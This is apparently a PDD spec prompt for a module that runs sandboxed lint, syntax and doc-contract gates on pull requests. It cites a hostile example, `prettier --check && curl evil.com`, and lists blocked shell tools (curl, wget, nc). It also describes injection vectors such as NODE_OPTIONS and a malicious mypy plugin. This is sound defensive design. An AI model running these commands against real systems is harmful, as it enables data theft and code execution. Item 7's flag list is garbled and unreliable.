<pdd-reason>Enforces deterministic-gate checks (linter, syntax, and doc-contract gates) in checkup review loops.</pdd-reason>
<pdd-interface>
{
  "type": "module",
  "module": {
    "functions": [
      {
        "name": "discover_gates",
        "signature": "(worktree: Path, changed_files: Sequence[str], *, extra_allow: Sequence[str] = (), base_ref: Optional[str] = None) -> List[Gate]",
        "returns": "List[Gate]"
      },
      {
        "name": "run_gates",
        "signature": "(worktree: Path, gates: Sequence[Gate], *, artifacts_dir: Path, round_number: int, mode: str, default_timeout: float = 60.0) -> List[GateResult]",
        "returns": "List[GateResult]"
      },
      {
        "name": "gate_results_to_findings",
        "signature": "(results: Sequence[GateResult], *, round_number: int) -> List[ReviewFinding]",
        "returns": "List[ReviewFinding]"
      },
      {
        "name": "run_doc_contract_check",
        "signature": "(worktree_path: Path, base_ref: Optional[str] = None) -> int",
        "returns": "int"
      }
    ],
    "classes": [
      { "name": "Gate" },
      { "name": "GateResult" }
    ]
  }
}
</pdd-interface>
<pdd-dependency>checkup_review_loop_python.prompt</pdd-dependency>

% Write `pdd/checkup_gates.py`, the deterministic-gate enforcement layer for `pdd checkup --pr --review-loop` (issue promptdriven/pdd#1092).

<include>context/python_preamble.prompt</include>

% Goal
Provide a conservative, allowlisted gate-discovery and gate-execution
surface that the review loop calls before honoring any LLM "clean"
verdict. A failing local gate (e.g. `prettier --check` on the PR
worktree) must convert into a synthetic blocker `ReviewFinding` so the
loop refuses to ship and the fixer addresses the failure.

% Role & Scope
A deterministic verification layer for PDD checkup review loops, responsible for discovering and executing local, non-agentic health checks (gates) such as syntax validation and linting.

% Requirements

### Public API
1. `@dataclass Gate(name: str, cmd: List[str], source: str, severity: str = "blocker", timeout: float = 60.0, area: str = "deterministic-gate", required_fix_hint: str = "")` — one discovered gate. `cmd` is the literal list-form argv. `source` is a human-readable origin (e.g. `package.json:scripts.format:check`).
2. `@dataclass GateResult(gate: Gate, exit_code: Optional[int], stdout_excerpt: str, stderr_excerpt: str, duration_seconds: float, started_at_iso: str, error: str = "")` — execution outcome. `exit_code is None` means the runner itself failed (timeout, FileNotFoundError, OSError). `passed` returns True iff `exit_code == 0`.
3. `discover_gates(worktree: Path, changed_files: Sequence[str], *, extra_allow: Sequence[str] = (), base_ref: Optional[str] = None) -> List[Gate]` — read-only inspection of the worktree to emit the allowlist set. When `base_ref` is supplied (the PR's target branch, e.g. `"main"`) and verifiable in the worktree, the `git-diff-check` gate runs across the PR range (`<base>...HEAD`) so a committed whitespace/conflict-marker failure is caught even when the worktree itself is clean. With no `base_ref` discovery still tries `origin/<base>`, `<base>`, `origin/main`/`origin/master`/`main`/`master` before falling back to the plain `git diff --check` against unstaged changes.
4. `run_gates(worktree: Path, gates: Sequence[Gate], *, artifacts_dir: Path, round_number: int, mode: str, default_timeout: float = 60.0) -> List[GateResult]` — execute every gate as a list-form subprocess. Persist `round-{R}-{mode}-gates.json` and per-gate `round-{R}-{mode}-gate-{slug}.txt`. Never raises.
5. `gate_results_to_findings(results: Sequence[GateResult], *, round_number: int) -> List[ReviewFinding]` — convert failing gates into synthetic blocker findings tagged `reviewer=f"gate:{gate.name}"`, `area="deterministic-gate"`, with the gate command and output excerpt in `evidence` and `required_fix`. Passed gates are skipped.
5a. `run_doc_contract_check(worktree_path: Path, base_ref: Optional[str] = None) -> int` — parses the git diff against `base_ref` (or HEAD/parent if `base_ref` is unresolvable) to find newly added user-facing surfaces (including `.pddrc` defaults keys, Click options, skip behaviors, and `PDD_*` environment variables) and verify that they are fully documented in `README.md` and prompts. Returns 0 on success, 1 on failure.

### Conservative v1 discovery set
6. `git diff --check` — always emitted when the worktree is a real git checkout AND a trusted `git` binary can be resolved outside the PR worktree via the sanitized PATH. The gate command MUST store that absolute `git` path (not bare `"git"`), and every discovery-time git probe (`rev-parse --verify`, `rev-parse --is-inside-work-tree`) MUST use the same absolute path plus the sanitized env. Skip when `.git` is absent so unit-test fixtures that mock `_setup_pr_worktree` to a bare `tmp_path` do not regress.
7. `package.json` scripts under any of `format:check`, `prettier:check`, `lint:check`, `typecheck`, `tsc`, `tsc:noemit` — only when the script command starts with `prettier --check`, `tsc --noEmit`, `tsc -p`, an `eslint` invocation that explicitly carries `--no-fix`, or the validated `npx --no-install` form of any of those tools. EVERY package-manager dispatch prefix (`npm run`, `yarn run`, `pnpm run`, `bun run`, bare `yarn`, `pnpm`, `bun`) is REJECTED — those dispatch to a different named script in `package.json` whose body was never validated, so a fork PR could chain through them (iter-31 Finding 1). Skip if the command contains `--write`, `--fix`, `git push`, `rm -`, `rimraf`, `--cache`, `build:`, OR contains any of `install` / `publish` / `deploy` / `start` / `build` AS A STANDALONE TOKEN. The standalone-token check (iter-31 Finding 3) is what stops a legitimate path like `prettier --check src/install.ts` from being false-rejected: bare-substring matching would treat the `install` inside the filename as the dangerous npm-install verb. The `--cache` rejection is LOAD-BEARING — eslint's `--cache` writes `.eslintcache`, prettier's `--cache` writes `.prettiercache`, and `tsc -p` without `--noEmit` writes `.tsbuildinfo`. Any of those land in the worktree and the downstream commit/push helper can stage them on repos whose `.gitignore` does not exclude them (gates must be non-mutating, issue #1092 product requirement; iter-26 Finding 2). The `tsc --noemit` / `tsc -p` heads use TOKENIZED matching for `--noEmit` so a different flag (`--noEmitOnError`) or an explicit disable (`--noEmit false` / `--noEmit no` / `--noEmit 0`) cannot bypass the substring check (iter-27 Finding 2). Any tsc-flavoured script argv is ALSO rejected when it contains any of these flags (`--noEmit` only suppresses .js/.d.ts emit, not any of these): `--watch` / `-w` / `--watch=true` (would hang the gate until timeout), `--incremental` without an explicit `false`/`no`/`0` value (writes `tsconfig.tsbuildinfo` even when `incremental: true` is set in tsconfig (bare `tsc --noEmit` writes it anyway under that config; iter-27 Finding 1); (d) `--composite false` overrides composite mode at the CLI so extends-chain `composite: true` bases don't trip TS6379 (iter-28 Finding 2). Without these guards the gate fails the issue #1092 product requirement that gates be local, deterministic, bounded, and non-mutating.
7a. Shell-injection guard: `<runner> run <name>` invokes a shell on the script body, so the allowlist MUST also reject any script command containing shell metacharacters or compound operators. The reject set includes (at minimum) `&&`, `||`, `;`, `|`, `&`, backtick (` `` `), `$(`, `${`, `>`, `>>`, `<`, `<<`, newline, carriage return, ` curl `, ` wget `, ` nc `, ` bash `, ` sh `, ` eval `, and `node -e`. Without this guard a poisoned `package.json` script like `"format:check": "prettier --check && curl evil.com"` would pass the head check and exfiltrate through the chained `curl`. The reject is case-insensitive for word fragments and case-preserving for substitution/redirection tokens (codex review iteration 1 Finding 1). Scope: POSIX shell metacharacters only; Windows cmd.exe metacharacters (e.g. `^`, `%VAR%`) are out of v1 scope because PDD is a Unix-first project and `package.json` scripts are conventionally written for POSIX shells (codex review iteration 2 Finding 3, info-level). The positive set still accepts legitimate scripts with globs or multiple file arguments, e.g. `prettier --check src/**/*.ts` or `prettier --check src/foo.ts src/bar.ts`.
8. TypeScript: when `tsconfig.json` exists AND `typescript` appears in any of the `dependencies` / `devDependencies` / `peerDependencies` maps AND `node_modules/typescript/bin/tsc` is already on disk AND `npx` is on PATH, AND the PR did NOT modify `tsconfig*.json` (PR-controlled compiler options/paths/plugins are RCE-equivalent), AND the PR did NOT modify ANY path under `node_modules/` (the gate would otherwise execute PR-controlled JavaScript via npx; iter-30 Finding 1 generalises iter-29 Finding 3), emit `tsc-noemit` running `npx --no-install tsc --noEmit --incremental false --composite false --tsBuildInfoFile <os.devnull>`. Every flag is LOAD-BEARING: (a) `--no-install` keeps npx from registry-fetching when typescript is declared but absent locally; (b) `--noEmit` skips `.js`/`.d.ts` emission; (c) `--incremental false` AND `--tsBuildInfoFile <devnull>` prevent `tsconfig.tsbuildinfo` from being written even when `incremental: true` is set in tsconfig (bare `tsc --noEmit` writes it anyway under that config; iter-27 Finding 1); (d) `--composite false` overrides composite mode at the CLI so extends-chain `composite: true` bases don't trip TS6379 (iter-28 Finding 2). Without these guards the gate fails the issue #1092 product requirement that gates be local, deterministic, bounded, and non-mutating.
9. Python compile sanity: for every changed `.py` file that exists in the worktree, emit a `py-compile:<rel>` gate running `python -B -c "import sys; src = open(sys.argv[1], 'rb').read(); compile(src, sys.argv[1], 'exec')" <abs>`. Two argv choices are LOAD-BEARING: (a) the source is read as BYTES (``open(..., 'rb')`` not ``open(..., 'r', encoding='utf-8')``) so the builtin ``compile()`` respects the file's PEP 263 encoding declaration (``# -*- coding: latin-1 -*-`` and friends); forcing ``encoding='utf-8'`` would raise ``UnicodeDecodeError`` on valid non-UTF-8 Python files and produce a false blocker. (b) routing the syntax check through the builtin ``compile()`` (not ``python -m py_compile``) is what avoids writing ``__pycache__/*.pyc`` — bare ``python -m py_compile <abs>`` writes the bytecode artifact regardless of ``-B`` (``py_compile.compile`` writes it explicitly), and ``py_compile.compile(..., cfile=os.devnull)`` also fails (py_compile uses an atomic rename onto ``cfile``, which cannot target ``/dev/null``). The builtin ``compile()`` validates syntax and raises ``SyntaxError`` on bad input without writing any bytecode at all. Without these guards the loop's downstream ``_commit_and_push_if_changed`` would stage untracked bytecode on a repo whose ``.gitignore`` does not exclude ``__pycache__/``, and the gate would push generated bytecode into the PR. Gates must be non-mutating (issue #1092 product requirement).
10. `ruff check -- <changed_py>` — only when `pyproject.toml` declares a `[tool.ruff]` section AND `ruff` is on PATH AND the PR did NOT touch any Python tool config (`pyproject.toml` / `setup.cfg` / `ruff.toml` / `.ruff.toml` / `tox.ini`). A PR-modified `[tool.ruff] exclude` / `extend-exclude` / disabled-rules block would otherwise silently let ruff exit 0 over real lint failures (iter-32 Finding 3).
11. `black --check -- <changed_py>` — only when `pyproject.toml` declares `[tool.black]` AND `black` is on PATH AND the PR did NOT touch any Python tool config. A PR-modified `[tool.black] force-exclude = '.*'` would otherwise make black exit 0 with "No Python files are present" over real formatting failures (iter-32 Finding 2).
12. `mypy -- <changed_py>` — only when `pyproject.toml` declares `[tool.mypy]` AND `mypy` is on PATH AND the PR did NOT touch any Python tool config (`pyproject.toml` / `setup.cfg` / `mypy.ini` / `.mypy.ini` / `tox.ini`) AND no mypy config surface declares any `plugins` entry that looks like a worktree-local path (contains `/`, `\\`, starts with `./`/`../`, or ends in `.py`) AND no `plugins` entry's top-level package name maps to a worktree package directory or module file. The plugin scan covers EVERY surface mypy actually reads: pyproject.toml's `[tool.mypy] plugins`, AND `mypy.ini` / `.mypy.ini` / `setup.cfg`'s `[mypy] plugins =` (iter-34 Finding 2; iter-32's pyproject-only scan missed the cited mypy.ini case). mypy honours `plugins = ["evil_plugin.py"]` and imports/executes the plugin during type-checking — and a STABLE pyproject.toml already referencing a local-path plugin lets the PR achieve RCE just by modifying the plugin file (iter-32 Finding 1; iter-31 Finding 2 caught the in-same-diff case). iter-38 Finding 3 generalises the local-path heuristic: a "pure package" plugin entry like `my_project.mypy_plugin` ALSO disables the gate when the worktree contains a top-level `my_project/` package (`__init__.py` present, namespace-package directory, or `my_project.py` module). iter-39 Finding 2 extends that check to the src/ layout: a matching `worktree/src/<top_level>/` (or namespace dir, or `worktree/src/<top_level>.py`) also disables the gate, because editable installs of src-layout projects add `src/` to `sys.path`. Under an editable install (or any setup that adds the worktree to `sys.path`) mypy's plugin import would otherwise resolve to the PR-modified module instead of a stable site-packages copy. Third-party pure-package plugins (e.g. `mypy_django_plugin.main`) whose top-level name appears NEITHER at the worktree root NOR under src/ stay supported.
12a. End-of-options `--` separator before the changed-file list is LOAD-BEARING. Without it a PR that adds a file named `--config=evil.py` (or any path starting with `-`) would feed that token to the tool as a flag instead of a path, bypassing the gate's intent and potentially altering its behaviour. POSIX-standard `--` tells ruff/black/mypy to treat every following arg as a positional path.
12b. `pdd checkup policy check -- <changed_py> --prompt <prompt>` — only for changed Python files whose prompt defines `<capabilities>`. Discovery resolves the prompt path; fails if code violates side-effect contracts.

### NOT in default discovery (codex flagged as too risky)
13. `.pre-commit-config.yaml` hooks. Skipped: hook author can run arbitrary shell.
14. Generic `Makefile` targets. Skipped: too environment-heavy (PDD's own `make lint` is conda+pylint).
15. `cargo check`, `go test`, etc. Skipped: not present in scope.
16. Targeted pytest. Deferred to a v2 follow-up.
17. `eslint` invocation that does not explicitly include `--no-fix`. Skipped: ESLint can mutate the worktree on some configurations.
17a. Nested-manifest workspaces. `_discover_npm_gates` only reads `worktree/package.json`; `_discover_python_gates` only reads `worktree/pyproject.toml`. Repos whose manifests live one or more directories down (e.g. `frontend/package.json` plus `backend/pyproject.toml`, or a monorepo where each `apps/<name>/package.json` carries its own `scripts` block) get NO JS/TS or Python tool gates discovered against those nested manifests. This is a deliberate scope limit: the safety contract behind every `node_modules_pr_touched` / config-touched / extends-chain skip is anchored at the worktree root; widening discovery to nested workspaces requires per-workspace cwd / lockfile / env-sanitization decisions that are not yet derived. Only `py-compile` (per PR-changed `.py` file anywhere in the worktree) and `git-diff-check` survive on nested-manifest layouts — they do not consult any root manifest. The direct `tsc-noemit` gate (item 8) is also root-anchored: it requires `typescript` declared in worktree-root `package.json` AND a worktree-root `tsconfig.json`, so a repo with only `frontend/package.json` + `frontend/tsconfig.json` gets no `tsc-noemit` either. There is no standalone direct `prettier --check` discovery — prettier only runs through the script-based `package.json:scripts.format:check` gate which is itself root-anchored. The README's "Deterministic-gate coverage limits" section documents this trade-off for operators.

### extra_allow
18. `extra_allow` is a forward-compatibility argument plumbed from the CLI's `--gate-allow` flag (repeatable). Accepted but does not yet widen the allowlist — every gate is allowlist-only. Future versions may consult this argument to opt extra gate names in.

### Runner contract (codex requirements)
19. All commands are list-form. NEVER `shell=True`. Each gate spawns `subprocess.run(list(gate.cmd), cwd=str(worktree), env=<scrubbed>, capture_output=True, text=True, timeout=<gate or default>, check=False)`.
20. Timeout per gate (default 60s). Use `gate.timeout` when set to a positive value; otherwise fall back to `default_timeout`.
21. Output captured then truncated to roughly 10,000 characters per stream. When truncation fires, append a short `[...truncated]` marker so an operator can tell artifacts are incomplete.
22. Scrub captured `stdout`/`stderr` through `pdd.checkup_review_loop._scrub_secrets` BEFORE persisting or rendering. Lazy-import to avoid a top-of-module cycle. The scrub MUST run BEFORE the 10 KB truncation (call shape: `_truncate(_scrub(text))`) — truncating first would leave a partial-token prefix the anchored scrub regex no longer matches.
22a. `Gate.to_dict()` MUST scrub every string field it serializes (`name`, each entry of `cmd`, `source`, `required_fix_hint`) through the same `_scrub_secrets`. The dict feeds the per-round JSON manifest (`round-{R}-{mode}-gates.json`) and the in-memory `state.gate_runs` row that the review loop persists into `final-state.json["gates"]` — both are long-term audit surfaces. A fork PR can poison `package.json` script bodies with literal tokens; without this scrub the manifest carries the raw token verbatim even though the captured stdout/stderr were redacted (iter-24 Finding 1). The Gate's bare `cmd` list still flows through `_execute_one` unchanged for the actual subprocess invocation; only the serialized projection scrubs.
22b. `GateResult.error` MUST be scrubbed at the source. `_execute_one`'s `FileNotFoundError`/`PermissionError`/`OSError`/generic-Exception branches all set `error=_scrub(f"{type(exc).__name__}: {exc}")` — Python's default repr for `FileNotFoundError` includes the full argv tuple, so an operator-supplied token in `gate.cmd` would otherwise land verbatim in `ReviewFinding.evidence` (rendered into the public PR comment) and the per-gate artifact. `_build_evidence` and `_build_required_fix` additionally scrub the cmd line they interpolate; this is belt-and-braces but cheap.
22c. Every consumer of `gate.name` and `gate.source` MUST scrub before interpolating. Per-file gates produce names like `py-compile:<rel>` where `<rel>` is a changed PR path — a PR can change a file whose path contains a token-shaped substring (e.g. `pkg/ghp_xxx.py`). Affected sites: the per-gate artifact filename slug (`_safe_slug(_scrub(gate.name))`), the per-gate artifact body (`gate:`/`source:` lines), `_build_evidence`'s source interpolation, `_build_finding_message`'s gate-name interpolation, and `gate_results_to_findings` setting `ReviewFinding.reviewer = f"gate:{_scrub(gate.name)}"` and `ReviewFinding.location = _scrub(gate.source)`. All of those land in the public PR comment and `final-state.json` (iter-25 Finding 1).
22d. The per-gate persistence WARNING/manifest WARNING log lines MUST scrub `gate.name` before interpolation AND MUST NOT re-emit the raw exception via `exc_info=True` (even at DEBUG). `traceback.format_exception` re-renders the raw exception message, which defeats the scrub on the WARNING line above. An operator who needs the full traceback can reproduce the failure locally without scrubbing (iter-25 Finding 3).
23. Working directory: the loop-owned PR worktree. Never the user's primary checkout.
24. Environment: inherit the caller's env then drop every key beginning with `PDD_` (so the gate cannot inherit reviewer/fixer state or token files), the Python import-path family (`PYTHONPATH` / `PYTHONHOME` / `PYTHONSTARTUP` / `PYTHONUSERBASE` / `PYTHONNOUSERSITE`), AND the npm/Node config + import-path family (every key matching `NPM_CONFIG_*` or `npm_config_*` — npm reads BOTH case forms as independent overrides — plus `NODE_OPTIONS` and `NODE_PATH`), then SANITIZE `PATH` to drop empty entries, `.`, relative entries, and any entry that resolves inside the loop's worktree, then force `CI=1`, `NO_COLOR=1`, `FORCE_COLOR=0`, and `COREPACK_ENABLE_AUTO_PIN=0` for deterministic non-interactive output. The `PYTHON*` strip is LOAD-BEARING (iter-38 Finding 3): a developer with `PYTHONPATH=.` in their shell would otherwise let mypy/ruff/black resolve a "pure package" plugin import (e.g. `my_project.mypy_plugin`) to a PR-controlled module inside the gate's `cwd`, achieving RCE through what looks like a stable config. The `NPM_CONFIG_*` / `npm_config_*` strip is equally LOAD-BEARING (iter-39 Finding 3): confirmed against npm 10.x, `NPM_CONFIG_SCRIPT_SHELL=./evil-sh` (or its lowercase `npm_config_script_shell`) makes `npm run` execute the PR-controlled shell even when `.npmrc` is safe. `NODE_OPTIONS=--require=./evil.js` injects arbitrary JS into the `npx --no-install tsc` gate; `NODE_PATH` is Node's `PYTHONPATH` analogue. The `COREPACK_ENABLE_AUTO_PIN=0` injection (iter-39 Finding 1) is also LOAD-BEARING: with Corepack's default auto-pin behaviour, the first `yarn run` / `pnpm run` inside the gate writes a `packageManager` field into `package.json`, mutating the loop-owned worktree and letting the downstream commit/push helper stage that change into the PR. The PATH sanitization (iter-40 Finding 1 + Greg PR #1095 review) closes a related vector — an operator with `PATH=.:$PATH` or any PATH entry that resolves inside the loop's worktree would otherwise let a PR-shipped `./git` binary take precedence over the trusted system `git` (item 6), achieving RCE. The Sanitized PATH MUST be computed ONCE at runner startup then used for ALL gates; it MUST NOT be re-computed per-gate.
25. `subprocess.run(..., check=False)`. The runner NEVER raises. Capture `subprocess.TimeoutExpired`, `FileNotFoundError`, `PermissionError`, generic `OSError`, and any unexpected `Exception` as a `GateResult` with `exit_code=None` and a non-empty `error` describing what happened. Treat that as a gate failure via `gate_results_to_findings`.
25a. Per-gate persistence is also exception-safe. `run_gates` MUST wrap each per-gate `write_text` call in a try/except and the aggregate-manifest `write_text` in a separate try/except. When a per-gate write fails (disk full, read-only fs), the runner OVERWRITES that gate's `GateResult` with a runner-error row (`exit_code=None`, `error=_scrub_secrets("<exc class>: <msg>")`) so the loop's findings adapter still surfaces the persistence failure — a single broken gate must not lose visibility into the others or let the caller mistake it for a pass. If the gate itself already failed, the persistence error is appended to `result.error` rather than clobbering the original exit code. Manifest-write failures are similarly logged with a scrubbed exception string. BOTH persistence paths MUST scrub the exception text BEFORE logging at WARNING AND MUST NOT pass `exc_info=True` on a follow-up `logger.debug` line (iter-25 Finding 3 + iter-40 Finding 3): `traceback.format_exception` re-renders the raw exception message, defeating the WARNING-line scrub, and CI/cloud log capture treats both WARNING and DEBUG as public surfaces when log level is verbose. An operator who needs the full traceback can reproduce the failure locally without scrubbing. The exception message can carry a path/string the operator allowed into `artifacts_dir`. The in-memory list is the authoritative ship-gate, not the JSON manifest (codex review iteration 1 Finding 3; iter-24 Finding 2).

### Artifact contract
26. The runner creates `artifacts_dir` with `mkdir(parents=True, exist_ok=True)`.
27. For each gate, write `round-{R}-{mode}-gate-{slug}.txt` containing the command, source, started timestamp, duration, exit code (or `<runner-error>` + error string), and the truncated/scrubbed stdout/stderr.
28. After all gates execute, write `round-{R}-{mode}-gates.json` containing the list of `GateResult.to_dict()` payloads in execution order. Per item 22a the nested gate dict is already scrubbed, so this manifest is safe to ship into long-term audit storage.
29. The artifacts root is `.pdd/checkup-review-loop/issue-{N}-pr-{M}/` so the existing `.pdd/*` gitignore filter prevents gate artifacts from being staged by `_commit_and_push_if_changed`.

### Findings adapter
30. `gate_results_to_findings` MUST construct one `ReviewFinding` per failing gate (`exit_code != 0` OR `exit_code is None`). Passed gates are skipped. Set `severity` to the gate's severity (default `blocker`), `reviewer` to `f"gate:{gate.name}"`, `area` to `"deterministic-gate"`, `location` to `gate.source`, and `round_number` to the caller-supplied round.
31. `evidence` must include the gate's command line and the (scrubbed/truncated) stderr or stdout tail so the fixer can see what the deterministic check actually reported. For runner-side failures (`exit_code is None`), `evidence` also carries the volatile detail (the runner's `error` string — exception class, `[Errno N]` codes, round-specific paths). That volatile detail MUST live in `evidence` ONLY; it MUST NOT appear in the `finding` field (see item 33a). Per-gate `stderr_excerpt`/`stdout_excerpt` are already scrubbed inside `run_gates` (item 22), so the renderer reads pre-scrubbed values from each `GateResult` dict. The synthetic crash-row finding built by `checkup_review_loop._gate_runner_crash_finding` MUST pass the raw exception message through `_scrub_secrets` before assigning it to `evidence` — that finding's `evidence` is published into a public GitHub comment AND persisted to `final-state.json["findings"]` (codex review iteration 3 secret-leak finding).
32. `required_fix` must spell out the local command to run (e.g., `Run \`npm run format:check\` locally and address the reported issues`), preserving the gate's `required_fix_hint` when present.
33. The dedup key (`ReviewFinding.key`) is stable across rounds for the same gate (severity + location + finding + required_fix) so a recurring failure does not produce duplicate findings.
33a. To preserve item 33's contract on the runner-side-error branch (`exit_code is None`), `_build_finding_message` MUST emit a fixed string that depends only on `gate.name`, never on `result.error`. Embedding the volatile error (which can contain round-specific paths such as `/tmp/round-1-...`) would make every round's identical persistence failure produce a different key, breaking dedup and spamming the rendered findings table (codex review iteration 2, Finding 1). The fixed message is `f"Deterministic gate {gate.name!r} failed to execute (runner error)."`; the volatile detail belongs in `evidence` via item 31.

### Issue #1433 Bug #2 — ruff format CI parity
34. **`ruff-format` gate (CI parity, gltanaka/pdd#1433 Bug #2 + codex pass-6/7/8 findings).** The ruff-format gate is INDEPENDENT of the ruff lint gate (codex pass-8 finding 3 — pre-fix code nested it inside the `[tool.ruff]` block and silently skipped projects that run `ruff format --check` in CI without any `[tool.ruff]` declaration). The format gate's prerequisites are JUST:
    - `changed_py` present
    - `ruff` binary resolved on the sanitized PATH via `_resolve_tool`
    - `python_tool_config_touched` is False (same fork-PR-poisoning defence as the lint gate)
    - One of the explicit/derived opt-in signals below.

    Opt-in signals (`_discover_python_gates` MUST emit a separate gate alongside `ruff` named `ruff-format` with argv `[ruff_abs, "format", "--check", "--", *changed_py]` when EITHER holds):
    - (a) `[tool.ruff.format]` is explicitly declared in `pyproject.toml` (the canonical opt-in; `source = "pyproject.toml:[tool.ruff.format]"`); OR
    - (b) `_ruff_format_signaled_by_ci(worktree, exclude_paths=...)` returns a truthy `(pre_commit_signaled, workflow_signaled)` — the helper scans `.pre-commit-config.yaml`, `cloudbuild-*-ci.yaml`, and `.github/workflows/*.yml` / `*.yaml`. The pre-commit signal is STAGE-AWARE (issue #1433 review): `_pre_commit_has_active_ruff_format(text)` counts an `id: ruff-format` hook only when it runs automatically — a manual-only hook (explicit `stages: [manual]` or an inherited top-level `default_stages: [manual]`) never runs in the normal commit/CI flow and MUST NOT opt the gate in, otherwise it emits a false blocking gate for ordinary changed Python. Workflow/CloudBuild signals are scanned via `_workflow_text_has_ruff_format` and stay INDEPENDENT — either source can opt in on its own. `source = "ci-config:ruff format"` in that case.

    Defence against PR poisoning (codex pass-7 finding 2): pass `exclude_paths` as the SET of worktree-relative POSIX paths of CI config files that appear in `changed_files`. The helper skips only those specific touched files from the scan — unchanged config files in the SAME PR still contribute their signal, so a PR that touches one workflow does NOT silently disable the signal from an unchanged `.pre-commit-config.yaml`. Pre-fix code short-circuited the whole branch when any CI config was in the diff (pass-6's hammer), defeating the gate's intent.

    Per-file pre-vs-post comparison for touched CI configs (codex pass-9 finding 2): for each path in `exclude_paths` the helper calls `_file_has_unchanged_ruff_format_signal(worktree, rel, base_ref)`. That helper reads the current worktree copy AND the pre-PR version via `git show <base_ref>:<path>` and returns True only when BOTH versions contain the signal. This distinguishes a PR that happened to touch an unrelated section of a file that already had `id: ruff-format` (count the signal) from a PR that introduced the `id: ruff-format` line itself (ignore — the project hadn't opted in before). When `base_ref` is absent or the git read fails the helper returns False (fail-open: no gate from ambiguous signals).

    YAML comment stripping before regex scan (codex pass-9 finding 1): `_strip_yaml_comments(text)` removes everything from the first `#` to EOL on every line before applying the `\bruff[\s-]+format\b` regex. Without this a `# TODO: enable ruff format` comment in a CI config was triggering a false-positive gate. The same stripping is applied to BOTH the current and pre-PR text in the per-file comparison.

    Pre-commit hook `files:` scope filtering (codex pass-9 finding 3): `_ruff_format_pre_commit_scope(worktree)` parses `.pre-commit-config.yaml` via `_parse_ruff_format_scopes_from_text` to extract `(files_pat, exclude_pat)` pairs for the AUTOMATICALLY-RUNNING `id: ruff-format` hooks (manual-only hooks are skipped — issue #1433 review — so a manual hook's scope never narrows or widens the gate's file set). `_filter_changed_py_for_ruff_format(worktree, changed_py)` keeps a file when it falls within ANY hook's scope (union — codex pass-10 finding 3: pre-fix returned after the first hook, silently dropping files covered only by later hooks). The gate uses the filtered list (possibly empty — skip entirely) instead of raw `changed_py`. When the YAML parse fails the full `changed_py` list is used (fail-open).

    Pyproject opt-in bypass of pre-commit scope (codex pass-10 finding 1): when `[tool.ruff.format]` is the opt-in source, `_filter_changed_py_for_ruff_format` is NOT applied — the pre-commit hook's `files:`/`exclude:` scope belongs to CI's pre-commit step, not to `ruff format` invoked directly. Applying the scope to the pyproject path silently dropped files outside the hook scope, re-opening Bug #2. Gate emission splits: pyproject opt-in → `ruff_format_py = list(changed_py)`; CI-signal opt-in → `ruff_format_py = _filter_changed_py_for_ruff_format(worktree, changed_py)`.

    Full hook config comparison in `_file_has_unchanged_ruff_format_signal` (codex pass-10 F2 + pass-11 F3 + pass-12 F3): after confirming the STAGE-AWARE signal (`_pre_commit_has_active_ruff_format`) holds in both base and HEAD — an unchanged manual-only hook does NOT count even in a touched file (issue #1433 review) — for `.pre-commit-config.yaml` the helper calls `_parse_ruff_format_hooks_from_text` on both text versions and compares the resulting `set` of JSON-serialised hook dicts (sorted keys). `_parse_ruff_format_hooks_from_text` merges top-level `files:`, `exclude:`, and `default_stages` into each hook dict that lacks its own value — so a PR that changes only `default_stages: [pre-commit]` → `[manual]` is detected even when the hook dict itself is unchanged (pass-12 F3). Any difference in the hook set returns False — treat the signal as PR-modified.

    Exec-context-aware scan for workflow files (codex pass-11 F2 + pass-12 F2, reworked in pass-13 F2/F3): `_workflow_text_has_ruff_format(text)` parses the workflow/CloudBuild YAML with `yaml.safe_load` and recursively walks the parsed structure (`_node_has_ruff_format`). It inspects ONLY the values of exec-intent mapping keys — `_RUFF_FORMAT_EXEC_KEYS = {run, script, command, entrypoint, args}` — via `_exec_value_has_ruff_format`: string values (including multi-line `run: |` block scalars) are matched after per-line `#`-shell-comment stripping; `args` lists are joined into an argv string and matched. Non-exec keys are never scanned. This replaced the earlier line-based heuristic, which was in tension between two failure modes: it false-positived on non-executable multi-line block scalars (e.g. an `env: NOTE: |` note mentioning `ruff format`, pass-13 F2) yet missed the inline `args: ["-c", "ruff format --check ."]` CloudBuild form (pass-13 F3). The YAML walk resolves both. Fail-open: a `yaml.YAMLError` returns False (a missed signal never blocks a clean verdict). The helper is also used in `_file_has_unchanged_ruff_format_signal` for non-pre-commit files so the pre-vs-post comparison applies the same exec-context check. The `_RUFF_FORMAT_CMD_PATTERN` (`\bruff\s+format\b`) is the space-only command form used by the workflow scan; `.pre-commit-config.yaml` no longer uses a raw regex — it routes through the stage-aware `_pre_commit_has_active_ruff_format` / `_parse_ruff_format_hooks_from_text` parser instead.

    The CI-signal branch exists because pass-5's `[tool.ruff.format]`-only rule produced false negatives for projects that run `ruff format --check` in CI using Ruff's default formatter config without declaring a `[tool.ruff.format]` section. Pass-4's `[tool.black] absent → opt-in` heuristic stays REMOVED — black runs on defaults without a declared section and was producing false positives.

    The `--` end-of-options separator and absolute tool path follow the same iter-25 / iter-40 contracts as the lint gate. Keep the format gate as a SEPARATE gate (not folded into the lint gate's argv) so per-tool `--gate-allow` filtering still works. `required_fix_hint`: `"Run `ruff format` locally and commit the formatting changes."`

35. **`doc-contract` gate (Issue #1303).** The doc-contract gate enforces documentation consistency on newly added user-facing surfaces.
    - **Discovery conditions**: Always emitted when a trusted `git` binary can be resolved and `_is_git_worktree` is True.
    - **Command argv (trusted execution)**: `[sys.executable, "-I", "-B", "-c", <RUNNER>, <worktree_abs>, <base_ref_or_empty>, <trusted_root>]`. The gate MUST run the TRUSTED installed/base checker, never a PR-controlled copy. Because `run_gates` executes every gate with `cwd=<worktree>`, a plain `-c "from pdd.checkup_gates import ..."` snippet would `import pdd` from the reviewed worktree (the PR's own `pdd/checkup_gates.py`), letting the reviewed code bypass the gate or run arbitrary code. Defend in layers: (a) launch the interpreter in isolated mode (`-I`) so the CWD/script dir is NOT prepended to `sys.path` and `PYTHON*` env vars / user-site are ignored; (b) the `<RUNNER>` snippet, BEFORE importing `pdd`, scrubs `sys.path` of every empty entry, the process CWD, and any path resolving inside the worktree (compare via `os.path.realpath`); and (c) it prepends `<trusted_root>` — the directory containing the running/base `pdd` package, computed by `discover_gates` in the trusted PARENT process via `Path(__file__).resolve().parent.parent` (never derived from the worktree) — so the import pins to the trusted checker AND the gate stays functional when `pdd` is reachable only via a source/editable checkout rather than site-packages. Only after that does it `from pdd.checkup_gates import run_doc_contract_check` and `sys.exit(run_doc_contract_check(sys.argv[1], sys.argv[2] if len(sys.argv) > 2 else None))`.
    - **Check execution (`run_doc_contract_check(worktree_path, base_ref=None) -> int`)**:
